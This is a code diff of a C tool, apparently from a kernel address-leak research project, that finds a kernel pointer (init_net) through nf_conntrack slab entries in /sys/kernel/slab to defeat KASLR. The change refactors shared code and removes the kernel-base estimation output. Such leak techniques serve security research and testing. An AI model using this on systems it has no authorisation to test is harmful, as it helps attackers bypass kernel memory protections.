@@ -15,27 +15,14 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <sys/utsname.h>
-
-// https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
-unsigned long KERNEL_BASE_MIN = 0xffffffff80000000ul;
-unsigned long KERNEL_BASE_MAX = 0xffffffffff000000ul;
-
-struct utsname get_kernel_version() {
-  struct utsname u;
-  if (uname(&u) != 0) {
-    printf("[-] uname(): %m\n");
-    exit(1);
-  }
-  return u;
-}
+#include "kasld.h"
 
 unsigned long get_kernel_addr_conntrack() {
   unsigned long addr = 0;
   struct dirent *dir;
   const char *path = "/sys/kernel/slab/";
   const char *needle = "nf_conntrack_";
-  const int addr_len = 16; /* 64-bit */
+  const int addr_len = sizeof(long*) * 2;
   char d_path[256];
 
   printf("[.] trying %s ...\n", path);
@@ -79,25 +66,11 @@ unsigned long get_kernel_addr_conntrack() {
 }
 
 int main(int argc, char **argv) {
-  struct utsname u = get_kernel_version();
-
-  if (strstr(u.machine, "64") == NULL) {
-    printf("[-] unsupported: system is not 64-bit.\n");
-    exit(1);
-  }
-
   unsigned long addr = get_kernel_addr_conntrack();
   if (!addr)
     return 1;
 
   printf("leaked init_net: %lx\n", addr);
-
-  if ((addr & 0xfffffffffff00000ul) == (addr & 0xffffffffff000000ul)) {
-    printf("kernel base (likely): %lx\n", addr & 0xfffffffffff00000ul);
-  } else {
-    printf("kernel base (possible): %lx\n", addr & 0xfffffffffff00000ul);
-    printf("kernel base (possible): %lx\n", addr & 0xffffffffff000000ul);
-  }
 
   return 0;
 }
